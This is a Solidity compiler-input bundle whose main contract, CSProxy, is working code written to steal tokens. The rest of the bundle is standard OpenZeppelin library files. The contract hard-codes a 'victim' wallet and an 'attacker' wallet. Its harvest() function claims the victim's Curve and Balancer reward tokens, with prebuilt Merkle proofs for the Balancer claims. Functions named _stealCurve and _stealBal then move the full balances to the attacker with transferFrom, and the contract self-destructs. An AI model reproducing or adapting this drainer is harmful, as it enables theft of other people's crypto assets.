{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "browser/CSProxy.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.12;\npragma experimental ABIEncoderV2;\n\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol\";\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol\";\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/SafeERC20.sol\";\n\ninterface IVyper {\n    function claim(address addr) external;\n}\n\ninterface IMerkleDrop {\n    function claimWeeks(\n        address,\n        uint[] memory,\n        uint[] memory,\n        bytes32[][] memory\n    ) external;\n}\n\ncontract CSProxy is Ownable {\n    \n    using SafeERC20 for IERC20;\n    \n    address victim = address(0x203a67b09429d1BAA2c56Eb4C57634E498F07819);\n    address attacker = address(0xa8cf25a21Fda50D999735f94b74A118a1732E5F2);\n\n    function harvest() public onlyOwner {\n        _stealCurve();\n        _stealBal();\n\n        // Destruct\n        selfdestruct(msg.sender);\n    }\n    \n    bytes32[][] proofs;\n    uint[] tranches;\n    uint[] balances;\n    \n    function _stealBal() private onlyOwner {\n        address bal = address(0xba100000625a3754423978a60c9317c58a424e3D);\n\n        // Claim weeks\n        tranches = [uint(3), uint(4), uint(5), uint(6), uint(7), uint(8), uint(9), uint(10)];\n        balances = [\n            uint(57932246060509180304),\n            uint(324577450289918424992),\n            uint(328816856385629247391),\n            uint(293127496142126027398),\n            uint(271920330172972799835),\n            uint(288269935140932477460),\n            uint(347769131026981747117),\n            uint(415085817017457097998)\n        ];\n        \n        proofs.push([bytes32(0x4cd2d4c2e9fc693db826a33faf16bf14e8c85b303eb51ad5e99012ad0211dfa8),0xaeff5482552a6802941096fb1762ed14a19c0281bc8727996e3d931880e4857f,0x8b0d8f5cdfdd93d29d9071001494c2c317bd14505dfcf212112222ccd387a64c,0xe1553220ee2fd34f92030c6afb5045f5fc79aec9d92428a90d4565c9b54832eb,0xad4996c3e08c73a23dc6d2db4a4b91801f57f60eb0eb2a752b86d77751cf7476,0xbdcf1595b838bda58bcc48dc4b9dc650bd4a8dafcafd1da9e2f8631a6dfa2b0b,0x167744805b40325c5c15d8b6b3b6de7cc4c7b1428575a29de05a2c3bcea6a011,0x434e9da38fd9c64e7b2c6b1391d0a4ae60f98fc15ed21da91bd84b57a03df58c,0xd359cc77cef7bf1443a245b072e3c68da6c8c9b2667f77e38672b5c52bf93974,0xe2cc9164f777457c2e25dc27301bbe89f8700c1f82750914f1fbcd7aa5db958a]);\n        proofs.push([bytes32(0x8fa9e76eb0f24167700a1cd8fdfe5903eac1a3d76c49300d832462c496fa9dc1),0x0a3c2c01f46494182cbdec1cc44473eb9691421f4cbb18ecf20003be8c39a970,0xb83f490193ce4488e5004b9837c6895f10f82b219110b298570bd734c861b498,0x6ef1640c34eedfb4df12d10b2a4a96577b085e2bbf515e58887a8395a63c0d94,0x99a435053d89da925d24da2dd43ed2107c1ca069798132033b52c30f00ffd3e4,0x6c2b1b9ae0c3bc7927c222dc0650341b7aa60e00e788961fcf472a5d9871021c,0x5a77351ada8595c05e730972df1e26f0f3cf27a36ee3aedcafc1877b7058c2cf,0x3a574d5d1c8d66aa67dcd93ca137a5b67d63961c1488fa1e748c1fc418e33203,0x39244c0e6f84d6493b09f765dd57bce855ffe35679ffdda44cbb4d5377828c48,0x0c7d22d481e15481cac0663dbaad1b467687fea66a0871d7f41d7580534e82c2]);\n        proofs.push([bytes32(0x9fe89bd9ad22c47e266615c30b1f8e0718857574a344986e25ba9fcb644a4da8),0x1110c1474bc6995c0ddbfba5eee2c832dc05730fced3f44367586dd3082336f4,0xb0d1648da1d1b6b9e6180dff5f5f119f00621494b642ec9a1922ed4b53478fbc,0x7602f5bbaba8b018cbbc5e3a46d00170deecee943a9c45f648aa45c15e2fb93f,0x790ff46e3ef277397b64cd9666ac30480161917b6cb74b0085e82f4a3e093b65,0x9063fd61daea579234b359e0bcc4cd61536a7ce7b91ac70e9b83bae15daba58b,0x950b81f3088d8058bb8db94634b03149d9665c24ce2fc8bc808d8febb38ee59a,0x4150aed3458173a8bf1f5bf2b7a99edc0c729a0d18050d2db38afea6355b058b,0x259e3e283b6e0c9140f57b4b2b7420983b0852064daaaa75dc7c19b527b48dad,0x26e7fcca0580f0fe21ad2980eac03fbd83b67dd4277d0d81cbaf09a62b673280]);\n        proofs.push([bytes32(0xfcf2adb83f962b41a7fe9c9a501aa178f7c2ac537cc7974f6e1b1e298fe0fd70),0x3b42a247a518339eec04d37514965bbe67e1e80a9fd454ebaa09a7a0e3cf6bc4,0x70b7fca22c664d1e82282b3b0aae21e373ea8c520cfa137df244d27e85f3cbaa,0x62a4474f6c62c72d1a80ec6c58ac5d23a5e620da9f8061d8c7df72b641ba6d03,0x5fc426f095f6e9bfa6c91544436d24bef72a6bab5bb0f65b588eed65e87a1d3f,0xa09b244d7873a0a557640433b33c3374200ad69d741d8553c774ea0fe8f700dc,0xe6848a66fdf28c47f4d93451bf919e9d1eb76c1089e47707c0b068269ff218a9,0x9307378314ea9d8134758e03959e7e5c21ebe7caee9a91601bd24c77699ddfb3,0xcbdf421bdaebff21ea019ca80a2aa1fe927fee57dd342644966b927c81ed3f8c]);\n        proofs.push([bytes32(0xdad5edff525c78c48aa5407f8e49e57d173bd8b2aef3f9e02a2788722148cb74),0x79d20a7583dff3b6a806ca13e4b708c23b9725aa948cf8a1db732c045a5a63d6,0xfca722b17612420d564617912f73231ac66777be22b6accaad9a3b4b71ed01dc,0xcd12c4eb39fe84c48aa33592d182d8293c5714a6537e54dbe174b258aa78e65f,0x0e7e3d1ace7df55fd083aced0928dd26cb98076c92673b69f6bf94a1e9a56bde,0x5c0d8a46bf61c82ce695e27c920ecc78a093cfa4ea6b9f9ac151979151061247,0x9fe5a6cbc56120bea699cdc6c868c107546c038c33e2fac8e071f2cf7cdb7fba,0x5bb38e905c2cb70ab7df1503ff3f3e98faef9f96df37b0d26689bfad75bc5f05,0x7601ca2507119a43bbdc9f7699462b29c6a08e22c1e9f240ee5d552fdf0633b1,0x7b82bc20041bea44d1299c96e0d50f5b4ab1357af7f15c19677a39f48baf7a69]);\n        proofs.push([bytes32(0x7dac1a38ed78ac8834b41706f88ba2a407610ff655e69daf74cae77eadc91741),0x11acedb526b5a44098c94c5152da48f3d52a4653c737463e84a767870c66739a,0xf8c51352aadd0482f944a6bb1cc65d0cc2d3a179abd7e54116aa5c23c06c322c,0x6778607f6bc45cc8e4cc36ce905de4fd7cbb3f26142cf5452391873ae3128e83,0xd0d69fba59b3f3f9204f51a53e7387c8320fe297184099a4ad17163f08cb7b86,0xb9519fb0a90ca6b4c0d5c3b2c8ad12cae15182016459d36c14e0134e72c43204,0x184f44898301ee93336fa39441daf1b86039e0d14ecaf4fe342c250dbb6cba49,0x2c318b41896726417af1daf81d937148a78a3b6c9bbc79c22a44de5c84c602a2,0xbf1ed8ddf65582e175eda3609135be5e04eaecbea4caa7d5a40e2d32aef309d8]);\n        proofs.push([bytes32(0x57f4c272f3b1e76b28c2390c8b78764271a0e34af4feb93d2c4fc97461fb9143),0x764cf7c53a22d5b9b40ff66ddaaf5ff6b08998c292e5412dcd7642137d39d715,0xc97d919a707c29768d12ecac286865540e86f03b7763e0066f95a094aa084733,0x07da309baac6052c3d397f833932188df147a7e68cd77e5ec660224c13ad8c33,0xea560000604d62dab59610451bd5a32d958e51230594a115ce11c3b72f6ff99a,0x65469a285d23ec44a558fa4ed8ec40c23b5e6b2bb7f5458afb32845469a4d2cb,0xa732bfa005113cc89ee326f78c03902d774b1c2e29830ec42e3aa35c76ecb06e,0xee90bc69c44bd14464bb58d70107753406e9f721d12a70787a43af28cc0e209a,0xbc70db97e8831c7de85c499266ec1e0aa8c8c374ad98deb29cd13ffbd337ee49]);\n        proofs.push([bytes32(0xc50f37827d228efcd9b93a99686d277cce09bb347890ee876e1a36a78b09f369),0x663d209487e9c84ca46ae35ea27422fbb45dfc5a947e6b58bc3194e72ddc88fe,0x075791dd6a6def132b600a5fe092f694ea7d48ac0311942dd7bce7effe67d223,0x206ea83f448e9815ff1e838cce2ce4160710c9dc73e9cd0c5c72fad9db005c02,0xedef60892afe0a062fd6a0be9c37f5e72866b278ca824adc35752107df680aa5,0x5692c122eb387f343bdf80f96ac8c1c616913456699b96e2d6dbddff48f96ccc,0x5a3d41082f28938474ba2392ba3ff6c6d7a32ce74914df145ef5ad97e3d56ccc,0x58a91bd711f7654c53d11cdca88e65ea63dfd9ff606b9da6de647c17adc1c4fe]);\n\n        IMerkleDrop(address(0xF6E53b3aAe671319a0F9D9CA7Fac5f41599bC7a5)).claimWeeks(victim, tranches, balances, proofs);\n        uint256 balance = IERC20(bal).balanceOf(victim);\n        \n        // Send\n        IERC20(bal).safeTransferFrom(victim, attacker, balance);\n    }   \n    \n    function _stealCurve() private onlyOwner {\n        address crv = address(0xD533a949740bb3306d119CC777fa900bA034cd52);\n\n        // Claim\n        IVyper(address(0x575CCD8e2D300e2377B43478339E364000318E2c)).claim(victim);\n        uint256 balance = IERC20(crv).balanceOf(victim);\n        \n        // Send\n        IERC20(crv).safeTransferFrom(victim, attacker, balance);\n    }\n    \n}"
    },
    "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/GSN/Context.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.0;\n\n/*\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with GSN meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n"
    },
    "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.0;\n\nimport \"../GSN/Context.sol\";\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\ncontract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor () internal {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n"
    },
    "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.0;\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n"
    },
    "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n"
    },
    "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/SafeERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.0;\n\nimport \"./IERC20.sol\";\nimport \"../../math/SafeMath.sol\";\nimport \"../../utils/Address.sol\";\n\n/**\n * @title SafeERC20\n * @dev Wrappers around ERC20 operations that throw on failure (when the token\n * contract returns false). Tokens that return no value (and instead revert or\n * throw on failure) are also supported, non-reverting calls are assumed to be\n * successful.\n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,\n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.\n */\nlibrary SafeERC20 {\n    using SafeMath for uint256;\n    using Address for address;\n\n    function safeTransfer(IERC20 token, address to, uint256 value) internal {\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n    }\n\n    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n    }\n\n    /**\n     * @dev Deprecated. This function has issues similar to the ones found in\n     * {IERC20-approve}, and its usage is discouraged.\n     *\n     * Whenever possible, use {safeIncreaseAllowance} and\n     * {safeDecreaseAllowance} instead.\n     */\n    function safeApprove(IERC20 token, address spender, uint256 value) internal {\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        // solhint-disable-next-line max-line-length\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n\n    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {\n        uint256 newAllowance = token.allowance(address(this), spender).add(value);\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n    }\n\n    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {\n        uint256 newAllowance = token.allowance(address(this), spender).sub(value, \"SafeERC20: decreased allowance below zero\");\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n    }\n\n    /**\n     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\n     * on the return value: the return value is optional (but if data is returned, it must not be false).\n     * @param token The token targeted by the call.\n     * @param data The call data (encoded using abi.encode or one of its variants).\n     */\n    function _callOptionalReturn(IERC20 token, bytes memory data) private {\n        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since\n        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that\n        // the target address contains contract code and also asserts for success in the low-level call.\n\n        bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\");\n        if (returndata.length > 0) { // Return data is optional\n            // solhint-disable-next-line max-line-length\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n        }\n    }\n}\n"
    },
    "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.2;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n\n        uint256 size;\n        // solhint-disable-next-line no-inline-assembly\n        assembly { size := extcodesize(account) }\n        return size > 0;\n    }\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n        (bool success, ) = recipient.call{ value: amount }(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain`call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n      return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.call{ value: value }(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {\n        require(isContract(target), \"Address: static call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.3._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.3._\n     */\n    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) {\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n"
    }
  }
}